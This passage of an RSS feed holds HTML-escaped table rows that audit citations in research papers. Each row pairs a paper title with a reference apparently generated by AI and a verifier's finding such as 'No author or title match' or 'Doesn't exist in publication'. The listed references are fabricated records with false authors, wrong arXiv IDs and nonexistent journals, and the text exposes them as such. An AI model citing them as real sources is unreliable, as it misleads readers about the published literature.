      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Andrew Black et al. Zero-shot skill composition with semantic feature fusion. arXiv preprint arXiv:2310.08573, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title match. ArXiv ID leads to unrelated paper.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;PointMapPolicy: Structured Point Cloud Processing for Multi-Modal Imitation Learning&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Yufei Wu, Kiran Alwala, Vivek Ganapathi, Sudeep Sharma, Yilun Chang, Yicheng Zhang, Yilun Zhou, et al. Susie: Scaling up instruction-following policies for robot manipulation. arXiv preprint arXiv:2402.17552, 2024.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. ArXiv ID leads to unrelated article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;FLAME: Fast Long-context Adaptive Memory for Event-based Vision&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Zhipeng Zhang, Chang Liu, Shihan Wu, and Yan Zhao. EST: Event spatio-temporal transformer for object recognition with event cameras. In ICASSP 2023 - 2023 IEEE International Conference on Acoustics, Speech and Signal Processing (ICASSP), pages 1-5. IEEE, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;FLAME: Fast Long-context Adaptive Memory for Event-based Vision&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Daniel Gehrig, Mathias Gehrig, John Monaghan, and Davide Scaramuzza. Recurrent vision transformers for dense prediction. In Proceedings of the IEEE/CVF International Conference on Computer Vision (ICCV) Workshops, pages 3139-3148, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author match, but this paper has a similar title. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Diversity Is All You Need for Contrastive Learning: Spectral Bounds on Gradient Magnitudes&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI**&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Qiyang Du, Ozan Sener, and Silvio Savarese. Agree to disagree: Adaptive learning with gradient disagreement. In Advances in Neural Information Processing Systems (NeurIPS), 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Sener and Savarese have published together previously. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Diversity Is All You Need for Contrastive Learning: Spectral Bounds on Gradient Magnitudes&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI**&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Longxuan Jing, Yu Tian, Yujun Pei, Yibing Shen, and Jiashi Feng. Understanding contrastive representation learning through alignment and uniformity on the hypersphere. In International Conference on Learning Representations (ICLR), 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author match. Title matches this paper. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;TokenSwap: A Lightweight Method to Disrupt Memorized Sequences in LLMs&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Yair Leviathan, Clemens Rosenbaum, and Slav Petrov. Fast inference from transformers via speculative decoding. In ICML, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Title, publisher, and date match this paper, but all authors except one surname (Leviathan) are different.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;TokenSwap: A Lightweight Method to Disrupt Memorized Sequences in LLMs&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Wenwen Chang, Tal Schuster, and Yann LeCun. Neural surgery for memorisation: Locating and removing verbatim recall neurons. In NeurIPS, 2024.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Learning the Wrong Lessons: Syntactic-Domain Spurious Correlations in Language Models&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;M. Garcia and A. Thompson. Applications of llms in legal document analysis. Journal of Legal Technology, 7(1):50-65, 2024.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Publication doesn't exist.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Learning the Wrong Lessons: Syntactic-Domain Spurious Correlations in Language Models&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;J. Smith and A. Patel. Leveraging large language models for financial forecasting. International Journal of Financial Technology, 9(2):101-115, 2024.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Publication doesn't exist.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;JADE: Joint Alignment and Deep Embedding for Multi-Slice Spatial Transcriptomics&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;David Jones et al. Gpsa: Gene expression and histology-based spatial alignment. Nature Methods, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;JADE: Joint Alignment and Deep Embedding for Multi-Slice Spatial Transcriptomics&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Zhihao Chen, Hantao Zhang, Yuhan Zhang, Zhanlin Hu, Quanquan Gu, Qing Zhang, and Shuo Suo. Slat: a transformer-based method for simultaneous alignment and clustering of spatial transcriptomics data. Nature Communications, 14(1):5548, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Improved Regret Bounds for Linear Bandits with Heavy-Tailed Rewards&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;François Baccelli, Gérard H. Taché, and Etienne Altman. Flow complexity and heavytailed delays in packet networks. Performance Evaluation, 49(1-4):427-449, 2002.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Improved Regret Bounds for Linear Bandits with Heavy-Tailed Rewards&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Saravanan Jebarajakirthy, Paurav Shukla, and Prashant Palvia. Heavy-tailed distributions in online ad response: A marketing analytics perspective. Journal of Business Research, 124:818-830, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;AutoSciDACT: Automated Scientific Discovery through Contrastive Embedding and Hypothesis Testing&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Mehdi Azabou, Micah Weber, Wenlin Ma, et al. Mineclip: Multimodal neural exploration of clip latents for automatic video annotation. arXiv preprint arXiv:2210.02870, 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. ArXiv ID leads to unrelated article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46720395</guid><pubDate>Thu, 22 Jan 2026 15:20:48 +0000</pubDate></item><item><title>It looks like the status/need-triage label was removed</title><link>https://github.com/google-gemini/gemini-cli/issues/16728</link><description>&lt;doc fingerprint="e9dfceee3b66ba3c"&gt;
  &lt;main&gt;
    &lt;list rend="ul"&gt;
